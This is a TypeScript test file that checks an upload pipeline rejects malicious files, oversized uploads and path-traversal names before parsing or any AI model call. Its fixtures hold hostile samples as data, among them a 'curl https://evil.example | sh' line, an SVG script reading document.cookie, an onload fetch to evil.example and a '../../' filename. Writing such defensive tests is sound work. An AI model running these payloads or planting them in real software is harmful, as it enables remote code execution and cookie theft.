/**
 * THR-08 Malicious uploads (SECURITY_AND_PRIVACY_PLAN §2 THR-08, CTL-3.11; M§85; TEST_PLAN
 * TST-EF-09). Through the shipped capture path: API-CAP-01 refuses types outside the allow-list and
 * mints a server-chosen object path; JOB-27 re-checks the stored object (size, sha256, magic bytes
 * against the declared MIME) before anything is parsed or sent to a model, so SVG, executables,
 * archives (ZIP containers such as docx), polyglots and swapped objects end as `UPLOAD_INVALID`.
 */
import { assert, assertEquals, assertFalse } from '@std/assert';
import { sha256Hex } from '../../_shared/crypto/hmac.ts';
import { jobContext } from '../../_shared/testing/intel.ts';
import { USER_A } from '../../_shared/testing/jwt.ts';
import { runCaptureAnalysis } from '../../worker/handlers/capture_analysis.ts';
import { assistApi, captureRow } from './helpers.ts';

const enc = new TextEncoder();

function bytes(...parts: (number[] | string | Uint8Array)[]): Uint8Array {
  const chunks = parts.map((p) =>
    typeof p === 'string' ? enc.encode(p) : p instanceof Uint8Array ? p : new Uint8Array(p),
  );
  const out = new Uint8Array(chunks.reduce((n, c) => n + c.byteLength, 0));
  let offset = 0;
  for (const c of chunks) {
    out.set(c, offset);
    offset += c.byteLength;
  }
  return out;
}

const PNG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];

const MALICIOUS: { label: string; mime: string; name: string; data: Uint8Array }[] = [
  {
    label: 'SVG with script declared as PNG',
    mime: 'image/png',
    name: 'logo.png',
    data: bytes(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
    ),
  },
  {
    label: 'XML-prefixed SVG declared as JPEG',
    mime: 'image/jpeg',
    name: 'photo.jpg',
    data: bytes('<?xml version="1.0"?>\n<svg onload="fetch(\'https://evil.example\')"></svg>'),
  },
  {
    label: 'Windows PE declared as PDF',
    mime: 'application/pdf',
    name: 'invoice.pdf',
    data: bytes([0x4d, 0x5a, 0x90, 0x00], 'This program cannot be run in DOS mode.'),
  },
  {
    label: 'ELF binary declared as PNG',
    mime: 'image/png',
    name: 'chart.png',
    data: bytes([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00], 'x'.repeat(32)),
  },
  {
    label: 'shell script declared as PDF',
    mime: 'application/pdf',
    name: 'run.pdf',
    data: bytes('#!/bin/sh\ncurl https://evil.example | sh\n'),
  },
  {
    label: 'docx (ZIP container) declared as PDF',
    mime: 'application/pdf',
    name: 'contract.pdf',
    data: bytes([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00], '[Content_Types].xml'),
  },
  {
    label: 'PNG renamed to PDF',
    mime: 'application/pdf',
    name: 'scan.pdf',
    data: bytes(PNG, [0, 0, 0, 13]),
  },
  {
    label: 'PDF/HTML polyglot declared as JPEG',
    mime: 'image/jpeg',
    name: 'img.jpg',
    data: bytes('%PDF-1.7\n<html><script>alert(1)</script></html>\n%%EOF'),
  },
  {
    label: 'encrypted PDF',
    mime: 'application/pdf',
    name: 'locked.pdf',
    data: bytes('%PDF-1.7\n1 0 obj << /Encrypt 2 0 R >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF'),
  },
];

Deno.test(
  'THR-08 API-CAP-01: executables, archives, SVG and HTML are refused before a signed URL; the object path is server-chosen',
  async () => {
    const s = await assistApi();
    for (const mime of [
      'image/svg+xml',
      'application/x-msdownload',
      'application/zip',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'text/html',
      'application/octet-stream',
    ]) {
      const res = await s.request('POST', '/captures/upload-url', {
        client_capture_id: crypto.randomUUID(),
        kind: 'file',
        mime,
        size_bytes: 2048,
        file_name: 'x.bin',
        sha256: 'a'.repeat(64),
        share_origin: 'in_app',
      });
      assertEquals(res.status, 422, mime);
      await res.body?.cancel();
    }
    const tooBig = await s.request('POST', '/captures/upload-url', {
      client_capture_id: crypto.randomUUID(),
      kind: 'pdf',
      mime: 'application/pdf',
      size_bytes: 500 * 1024 * 1024,
      file_name: 'huge.pdf',
      sha256: 'a'.repeat(64),
      share_origin: 'in_app',
    });
    assertEquals(tooBig.status, 413, 'PAYLOAD_TOO_LARGE before any signed URL');
    await tooBig.body?.cancel();

    const traversal = await s.request('POST', '/captures/upload-url', {
      client_capture_id: crypto.randomUUID(),
      kind: 'pdf',
      mime: 'application/pdf',
      size_bytes: 1024,
      file_name: '../../22222222-2222-4222-8222-222222222222/evil.pdf',
      sha256: 'b'.repeat(64),
      share_origin: 'in_app',
    });
    assertEquals(traversal.status, 201);
    const data = (await traversal.json()).data;
    const path: string = data.upload.path;
    assert(path.startsWith(`${USER_A}/${data.capture_id}/`), path);
    assertFalse(path.includes('..') || path.includes('evil') || path.includes('2222'), path);
    assertEquals(s.fx.store.captures.find((c) => c.id === data.capture_id)?.storage_path, path);
  },
);

Deno.test(
  'THR-08 JOB-27: a stored object whose bytes are not what was declared ends UPLOAD_INVALID and never reaches the model',
  async () => {
    const s = await assistApi();
    for (const upload of MALICIOUS) {
      const capture = captureRow({
        kind: upload.mime === 'application/pdf' ? 'pdf' : 'photo',
        storage_path: `${USER_A}/${crypto.randomUUID()}/${crypto.randomUUID()}.bin`,
        mime_type: upload.mime,
        size_bytes: upload.data.byteLength,
        sha256: await sha256Hex(upload.data),
        original_filename: upload.name,
      });
      s.fx.store.captures.push(capture);
      await s.fx.storage.upload('captures', capture.storage_path ?? '', upload.data, upload.mime);
      const out = await runCaptureAnalysis(
        s.fx.jobs,
        jobContext({ capture_id: capture.id }, { type: 'capture_analysis' }),
      );
      assertEquals([out.status, out.error_code], ['failed', 'UPLOAD_INVALID'], upload.label);
      const row = s.fx.store.captures.find((c) => c.id === capture.id);
      assertEquals(row?.status, 'failed', upload.label);
      assertEquals(row?.extracted, [], upload.label);
    }
    assertEquals(s.fx.ai.calls, [], 'no malicious file reached a model');
  },
);

Deno.test(
  'THR-08 JOB-27: an object swapped after upload (sha256 or size mismatch) is refused',
  async () => {
    const s = await assistApi();
    const genuine = bytes('%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF');
    const swapped = bytes('%PDF-1.7\n1 0 obj << /JS (app.alert(1)) >> endobj\n%%EOF');
    for (const variant of ['sha256', 'size'] as const) {
      const stored = variant === 'size' ? bytes(genuine, ' ') : swapped;
      const capture = captureRow({
        kind: 'pdf',
        storage_path: `${USER_A}/${crypto.randomUUID()}/${crypto.randomUUID()}.pdf`,
        mime_type: 'application/pdf',
        size_bytes: genuine.byteLength,
        sha256: await sha256Hex(genuine),
        original_filename: 'teklif.pdf',
      });
      s.fx.store.captures.push(capture);
      await s.fx.storage.upload('captures', capture.storage_path ?? '', stored, 'application/pdf');
      const out = await runCaptureAnalysis(
        s.fx.jobs,
        jobContext({ capture_id: capture.id }, { type: 'capture_analysis' }),
      );
      assertEquals([out.status, out.error_code], ['failed', 'UPLOAD_INVALID'], variant);
    }
    assertEquals(s.fx.ai.calls, []);
  },
);
